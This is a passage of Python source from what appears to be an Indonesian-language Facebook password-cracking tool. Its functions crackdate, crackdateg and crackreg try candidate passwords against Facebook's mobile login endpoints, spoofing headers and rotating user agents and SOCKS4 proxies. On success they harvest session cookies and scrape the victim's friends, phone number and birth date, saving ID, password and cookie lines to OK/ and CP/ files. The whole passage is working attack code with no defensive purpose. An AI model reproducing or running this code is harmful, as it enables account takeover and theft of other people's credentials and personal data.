					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def crackdate(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen8)
	ua = uaasepitgansxc()
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Validate [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get('https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.latest.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.latest.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.latest.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
	
def crackdateg(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Validate [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	ug = random.choice(ugen3)
	ua = uaasepitgansxc()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	

	
def crackreg(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ug = random.choice(ugen3)
	ua = uaasepitgansxc()
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Reguler [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
